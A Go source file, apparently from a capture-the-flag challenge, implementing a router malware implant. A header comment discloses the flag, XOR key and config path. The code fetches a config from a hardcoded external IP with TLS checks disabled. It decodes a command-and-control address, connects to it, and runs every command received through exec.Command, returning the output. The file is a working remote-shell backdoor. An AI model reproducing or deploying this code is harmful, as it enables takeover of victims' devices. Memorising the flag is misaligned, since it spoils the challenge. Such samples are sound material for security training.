/*
 * Drop the config with the xored flag there
 * Flag: CSC{Inf3cted_routers_can_be_a_pain}
 * Key: a5cbd71c79424298bfdcc8d10a433acb
 * Path: /lib/config/aHV0Y2h5.conf
 * Content: {"d":"neXvMkFseg==","s":"nfPvJA==","k":"5piUXjw5C/bZ76ulbydlucq+o3kLMR373rKXs28cW5TVqr5yBA=="}
 */

package main

import (
	"bufio"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"os/exec"
	"time"
)

type Config struct {
	RemoteIP   string `json:"d"`
	RemotePORT string `json:"s"`
	Key        string `json:"k"`
}

type Params struct {
	ConfigPath string
}

func check(e error) {
	if e != nil {
		panic(e)
	}
}

func downcnc(filepath string, url string) (err error) {
	// Get the data
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	client := &http.Client{
		Timeout: time.Second * 10,
	}
	req, _ := http.NewRequest("GET", url, nil)
	if err != nil {
		return err
	}

	req.Header.Add("X-C2C", "CSC{N0t_th3_fl4g}")
	resp, _ := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// Check server response
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("bad status: %s", resp.Status)
	}

	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()
	// Writer the body to file
	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return err
	}

	return nil
}

func readConfig(path string) ([]byte, []byte, []byte, error) {
	jsonFile, err := os.Open(path)
	if err != nil {
		// Path probably doesn't exist
		err := downcnc(path, "https://108.129.42.183/mips/aHV0Y2h5.conf")
		check(err)
		jsonFile, err = os.Open(path)
		check(err)
	}
	byteValue, _ := ioutil.ReadAll(jsonFile)
	defer jsonFile.Close()

	var config Config

	err = json.Unmarshal(byteValue, &config)
	check(err)
	key, err := base64.StdEncoding.DecodeString(config.Key)
	check(err)
	ip, err := base64.StdEncoding.DecodeString(config.RemoteIP)
	check(err)
	port, err := base64.StdEncoding.DecodeString(config.RemotePORT)
	check(err)
	return ip, port, key, err
}

func ctwocxor(input, key []byte) []byte {
	eb := make([]byte, len(input))
	for i := 0; i < len(input); i++ {
		eb[i] = input[i] ^ key[i%len(key)]
	}
	return eb
}

func main() {
	s := "a5cbd71c79424298bfdcc8d10a433acb"
	configPath := "/lib/config/aHV0Y2h5.conf"
	key, err := hex.DecodeString(s)
	check(err)
	ip, port, encKey, err := readConfig(configPath)
	check(err)
	dIP := ctwocxor(ip, key)
	dPort := ctwocxor(port, key)
	dEncKey := ctwocxor(encKey, key)
	address := string(dIP) + ":" + string(dPort)

	conn, _ := net.Dial("tcp", address)
	for {
		message, _ := bufio.NewReader(conn).ReadString('\n')
		if len(message) < 2 {
			break
		}
		encMsg, err := base64.StdEncoding.DecodeString(message)
		check(err)
		cmd := ctwocxor(encMsg, dEncKey)
		fmt.Printf("Recived command: %s", cmd)
		out, err := exec.Command(string(cmd)).Output()

		if err != nil {
			fmt.Fprintf(conn, "%s\n", err)
		}

		fmt.Fprintf(conn, "%s\n", out)
	}
}
